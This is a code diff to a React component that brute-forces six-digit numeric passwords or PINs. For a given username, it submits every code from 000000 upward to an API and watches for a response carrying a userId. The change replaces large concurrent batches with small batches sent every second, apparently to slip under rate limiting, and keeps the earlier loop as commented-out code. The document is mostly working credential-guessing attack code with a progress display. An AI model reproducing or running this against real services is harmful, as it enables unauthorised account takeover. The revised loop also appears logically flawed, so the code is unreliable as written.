@@ -100,6 +100,7 @@ export default function ProgressDemo() {
 
   const findPassword2 = async (u: string) => {
     let arr = [];
+
     for (let i = 0; i <= 1000000; i++) {
       let result = i.toString();
       while (result.length < 6) {
@@ -107,38 +108,68 @@ export default function ProgressDemo() {
       }
       arr.push(result);
     }
-    for (let i = 0; i <= 1000000; i += 1000) {
-      const batch = arr.slice(i, i + 1000);
-      const result = await Promise.all(
-        batch.map(async (p) => {
-          try {
-            const res = (await callAPI(u, p)) as any;
-            if (res && res.userId) {
-              return p;
+    setInterval(async function () {
+      let t = 0;
+      while (t <= 1000000) {
+        const batch = arr.slice(t, t + 5);
+        const result = await Promise.all(
+          batch.map(async (p) => {
+            try {
+              const res = (await callAPI(u, p)) as any;
+              console.log(res);
+              if (res && res.userId) {
+                return p;
+              }
+              return "0";
+            } catch (e) {}
+          })
+        );
+        setProgress((t * 100) / 1000000);
+        // console.log(result);
+        // break;
+        if (result.some((res) => res !== "0")) {
+          for (let j = 0; j < 5; j++) {
+            if (result[j] !== "0") {
+              setPassword(result[j] as string);
+              setProgress(100);
+              setTiming(false);
+              break;
             }
-            return "0";
-          } catch (e) {
-            setProgress(100);
-            setTiming(false);
-            setPassword("Something error");
           }
-        })
-      );
-      setProgress((i * 100) / 1000000);
-      console.log(result);
-      // break;
-      if (result.some((res) => res !== "0")) {
-        for (let j = 0; j < 1000; j++) {
-          if (result[j] !== "0") {
-            setPassword(result[j] as string);
-            setProgress(100);
-            setTiming(false);
-            break;
-          }
+          t += 5;
+          break;
         }
-        break;
       }
-    }
+    }, 1000);
+    // for (let i = 0; i <= 1000000; i += 5) {
+    //   const batch = arr.slice(i, i + 5);
+    //   const result = await Promise.all(
+    //     batch.map(async (p) => {
+    //       try {
+    //         const res = (await callAPI(u, p)) as any;
+    //         console.log(res);
+    //         if (res && res.userId) {
+    //           return p;
+    //         }
+    //         return "0";
+    //       } catch (e) {}
+    //     })
+    //   );
+    //   setProgress((i * 100) / 1000000);
+    //   // console.log(result);
+    //   // break;
+    //   if (result.some((res) => res !== "0")) {
+    //     for (let j = 0; j < 5; j++) {
+    //       if (result[j] !== "0") {
+    //         setPassword(result[j] as string);
+    //         setProgress(100);
+    //         setTiming(false);
+    //         break;
+    //       }
+    //     }
+    //     break;
+    //   }
+    // }
   };
 
   return (
